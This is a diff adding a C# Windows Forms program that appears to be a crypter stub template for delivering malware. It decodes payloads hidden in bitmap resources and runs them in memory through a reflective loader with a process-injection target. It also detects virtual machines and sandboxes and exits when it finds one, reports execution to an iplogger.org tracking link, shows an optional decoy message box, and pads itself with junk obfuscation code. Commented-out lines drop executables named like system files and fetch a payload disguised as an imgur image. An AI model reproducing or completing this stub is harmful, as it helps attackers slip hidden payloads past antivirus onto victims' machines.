@@ -1,0 +1,476 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Resources;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+
+[assembly: AssemblyTitle("[Title]")]
+[assembly: AssemblyDescription("[Description]")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("[Company]")]
+[assembly: AssemblyProduct("[Product]")]
+[assembly: AssemblyCopyright("[Copyright]")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("[Guid]")]
+[assembly: AssemblyVersion("7.0.0.0")]
+[assembly: AssemblyFileVersion("[Version]")]
+
+
+
+namespace Program
+{
+    public class Console : Form
+    {
+        class Var
+        {
+            public static ResourceManager reso = new ResourceManager("[resName]", Assembly.Load(File.ReadAllBytes(Application.ExecutablePath)));
+
+            public static byte[] file_1 = Help.ConvertFromBmp((Bitmap)reso.GetObject("[fileName]"));
+            public static byte[] loader = Help.ConvertFromBmp((Bitmap)reso.GetObject("[loaderName]"));
+#if FILE
+        public static byte[] file_2 = Help.ConvertFromBmp((Bitmap)reso.GetObject("[fileName2]"));
+#endif
+        }
+#if VM
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string running);
+        public static bool DetectVM()
+        {
+            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                            || manufacturer.Contains("vmware")
+                            || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
+                   || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
+                   GetModuleHandle("snxhk.dll").ToInt32() != 0)
+                        {
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+#endif
+#if LOGGER
+        public static void Logger(string adr, string res)
+        {
+            
+            try
+            {
+                string ipLogLink = adr;
+                string respon = res;
+
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(ipLogLink);
+
+                req.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
+                req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
+                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+                using (StreamReader stream = new StreamReader(
+                     resp.GetResponseStream(), Encoding.UTF8))
+                {
+                    respon = stream.ReadToEnd();
+
+                    if (respon != "" || respon != String.Empty)
+                    {
+                       
+                    }
+                }
+
+            }
+            catch (Exception) { }
+            
+        }
+#endif
+
+        public Console()
+        {
+
+            InitializeComponent();
+            string po = tb3.Text;
+            string ol = tb1.Text;
+            string op = tb2.Text;
+#if VM
+                if (DetectVM())
+                System.Diagnostics.Process.GetCurrentProcess().Kill();
+#endif
+
+            if (checkBox2.Checked)
+            {
+                pictureBox1.Image = (Bitmap)Var.reso.GetObject("[fileName]");
+            }
+            Assembly.Load(Var.loader).GetType(ol).GetMethod(op).Invoke(null, new object[] { Var.file_1, po });// https://iplogger.org/1QMn67
+
+            // string ppp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sihost2.exe";
+            //   File.WriteAllBytes(ppp, Var.file_1);
+            //   System.Diagnostics.Process.Start(ppp);
+            /* string loader = @"https://po.imgur.com/NSiKeXn.png"; // No Startup     
+             var requestLoader = WebRequest.Create(loader);
+             Bitmap img;
+             using (var response = requestLoader.GetResponse())
+             using (var stream = response.GetResponseStream())
+             {
+                 img = (Bitmap)Image.FromStream(stream);
+             }
+             byte[] music = Help.ConvertFromBmp(img);
+             Assembly
+                 .Load(music)
+                 .GetType(ol)
+                 .GetMethod(op)
+                 .Invoke(null, new object[] { Var.file_1, po });*/
+
+
+#if FILE
+                    Assembly.Load(Var.loader).GetType(ol).GetMethod(op).Invoke(null, new object[] { Var.file_2, po });
+                 //   string ppp1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sihost.exe";
+                 //   File.WriteAllBytes(ppp1, Var.file_2);
+                //    System.Diagnostics.Process.Start(ppp1);      
+#endif
+
+#if LOGGER
+            Logger("[IP]", "Execute");
+#endif
+
+#if FAKE
+                Fake();
+#endif
+            Environment.Exit(0);
+
+        }
+
+        private TextBox tb1;
+        private TextBox tb2;
+        private TextBox tb3;
+        private CheckBox checkBox1;
+        private Button button1;
+        private PictureBox pictureBox1;
+        private CheckBox checkBox2;
+        private Panel panel1;
+        private Button button2;
+        private Button button3;
+        private System.ComponentModel.IContainer components;
+
+        private void InitializeComponent()
+        {
+            this.tb1 = new System.Windows.Forms.TextBox();
+            this.tb2 = new System.Windows.Forms.TextBox();
+            this.tb3 = new System.Windows.Forms.TextBox();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // tb1
+            // 
+            this.tb1.Location = new System.Drawing.Point(597, 113);
+            this.tb1.Name = "tb1";
+            this.tb1.Size = new System.Drawing.Size(91, 20);
+            this.tb1.TabIndex = 0;
+            this.tb1.Text = "Program.Ran";
+            // 
+            // tb2
+            // 
+            this.tb2.Location = new System.Drawing.Point(462, 284);
+            this.tb2.Name = "tb2";
+            this.tb2.Size = new System.Drawing.Size(91, 20);
+            this.tb2.TabIndex = 1;
+            this.tb2.Text = "RRPP";
+            // 
+            // tb3
+            // 
+            this.tb3.Location = new System.Drawing.Point(227, 83);
+            this.tb3.Name = "tb3";
+            this.tb3.Size = new System.Drawing.Size(91, 20);
+            this.tb3.TabIndex = 2;
+            this.tb3.Text = "[inject]";
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(25, 113);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(80, 17);
+            this.checkBox1.TabIndex = 3;
+            this.checkBox1.Text = "checkBox1";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            this.checkBox1.CheckedChanged += new System.EventHandler(this.CheckBox1_CheckedChanged);
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(462, 310);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "button1";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.Button1_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(20, 178);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(251, 115);
+            this.pictureBox1.TabIndex = 5;
+            this.pictureBox1.TabStop = false;
+            // 
+            // checkBox2
+            // 
+            this.checkBox2.AutoSize = true;
+            this.checkBox2.Checked = true;
+            this.checkBox2.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.checkBox2.Location = new System.Drawing.Point(20, 155);
+            this.checkBox2.Name = "checkBox2";
+            this.checkBox2.Size = new System.Drawing.Size(80, 17);
+            this.checkBox2.TabIndex = 6;
+            this.checkBox2.Text = "checkBox2";
+            this.checkBox2.UseVisualStyleBackColor = true;
+            // 
+            // panel1
+            // 
+            this.panel1.Location = new System.Drawing.Point(462, 178);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(200, 100);
+            this.panel1.TabIndex = 7;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(20, 299);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 8;
+            this.button2.Text = "button2";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.Button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(101, 299);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 9;
+            this.button3.Text = "button3";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.Button3_Click);
+            // 
+            // Console
+            // 
+            this.ClientSize = new System.Drawing.Size(856, 357);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.panel1);
+            this.Controls.Add(this.checkBox2);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.tb3);
+            this.Controls.Add(this.tb2);
+            this.Controls.Add(this.tb1);
+            this.Name = "Console";
+            this.Text = "Main Form";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Button1_Click(object sender, EventArgs e)
+        {
+            if (checkBox1.Checked)
+            {
+
+            }
+        }
+
+        private void Button2_Click(object sender, EventArgs e)
+        {
+            sbyte uAtwHK = -95;
+            byte JKTzIpC = 223;
+            int tIfggfMFQwXWcVzA = 15;
+            while (tIfggfMFQwXWcVzA == 15)
+            {
+                tIfggfMFQwXWcVzA += 750910;
+            }
+            int cNezdJGqMzPAosmpUfqRkNHY = 16;
+            while (cNezdJGqMzPAosmpUfqRkNHY == 16)
+            {
+                cNezdJGqMzPAosmpUfqRkNHY = 432870;
+            }
+            string fpdtanBgQGjFgYkQUcn = "xMFpfgyVCkQo";
+            ushort uZoToHFj = 1247;
+            int cRbXpAziMjuLNmUQF = 60824335;
+            if (cRbXpAziMjuLNmUQF == 186409)
+            {
+                cRbXpAziMjuLNmUQF = cRbXpAziMjuLNmUQF + 936459;
+            }
+            int CbNHNlLZO = 29;
+            while (CbNHNlLZO == 29)
+            {
+                CbNHNlLZO = CbNHNlLZO + 713989;
+            }
+            short JZanCG = -5879;
+            ulong FwOHTVyMPzLCZYJMZjFuHuUzPCXFX = 26171050940926008;
+            sbyte uYlxmGFK = -120;
+            short CxRwtjBpSqYSOPctL = -17428;
+            short BTYjxwYISjSVn = -5744;
+            uint CwuyOVnTxgyIjmUyLWcJyHZYlTyIA = 58;
+            short dSoSSGFFfOp = 29495;
+            short GpujqtPCVxxlVzG = -8518;
+            ushort epgwFFTqydsSKaVwR = 23011;
+            sbyte mZCCXTxHLfYMuOSaqkLPqaVMjc = 59;
+            ushort AInnBofOFzL = 10791;
+            byte seGzVhVeHHpCmdQsVgb = 79;
+            byte LzTANlMNaHeuEHE = 146;
+            float wuaHXZbbX = -33307.24F;
+            int VuTugF = 397971;
+        }
+
+        private void Button3_Click(object sender, EventArgs e)
+        {
+            string OUcieuRKRIIXkZLoQp = "QDBWAUcCRI";
+            ushort ZqhdqZgUVwUbhdKUxqj = 33475;
+            ushort obnXDocTZ = 2112;
+            ushort IGc = 59296;
+            ushort KwtuJzOwjh = 5697;
+            uint WjNcfQtxRSbwSHf = 77423;
+            float XVRaSUtQjhfUPAEAS = 212009.3F;
+            double aSSEs = 1.139659E+24;
+            aSSEs = Math.Ceiling(Math.Sinh(-5));
+            try
+            {
+                int YxBWEY = 430793;
+                if (YxBWEY == 53585)
+                {
+                    YxBWEY++;
+                }
+                else
+                {
+                    YxBWEY--;
+
+
+                }
+            }
+            catch { }
+        }
+#if FAKE
+        private void Fake()
+        {
+            string message = "[Fake]";
+            string headline = @"[Zagol]";
+            string text = @"[TextFake]";
+
+            switch (message)
+            {
+                case "None":
+                    break;
+                case "Information":
+                  
+                    MessageBox.Show(text, headline, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                    break;
+                case "Question":
+                 
+                    MessageBox.Show(text, headline, MessageBoxButtons.OK, MessageBoxIcon.Question);
+                    break;
+                case "Warning":
+                
+                    MessageBox.Show(text, headline, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    break;
+                case "Error":
+                
+                    MessageBox.Show(text, headline, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    break;
+            }
+        }
+#endif
+
+
+
+
+
+
+
+    }
+    class Help
+    {
+        /* public static byte[] Dec(Bitmap img)
+         {
+             StringBuilder ohlred = new StringBuilder();
+             int xmax = img.Width - 1;
+             int ymax = img.Height - 1;
+             for (int y = 1; y <= ymax; y++)
+             {
+                 for (int x = 1; x <= xmax; x++)
+                 {
+                     Color c = img.GetPixel(x, y);
+                     ohlred.Append((char)c.R);
+                 }
+             }
+             string test = ohlred.ToString().Replace(ConvertToChar().ToString(), null);
+             return Convert.FromBase64String(test);
+         }
+         public static char ConvertToChar()
+         {
+             return Convert.ToChar(0);
+         }*/
+
+        public static byte[] ConvertFromBmp(Bitmap b)
+        {
+            int ol = b.Width;
+            int n = ol * ol * 4;
+            byte[] buff = new byte[n];
+            int k = 0;
+            for (int x = 0; x < ol; x++)
+            {
+                for (int y = 0; y < ol; y++)
+                {
+                    Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(x, y).ToArgb()), 0, buff, k, 4);
+                    k += 4;
+                }
+            }
+            int len = BitConverter.ToInt32(buff, 0);
+            byte[] f = new byte[len];
+            Buffer.BlockCopy(buff, 4, f, 0, f.Length);
+
+            return f;
+        }
+    }
+
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+       // [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Console());
+        }
+    }
+
+
+}
+
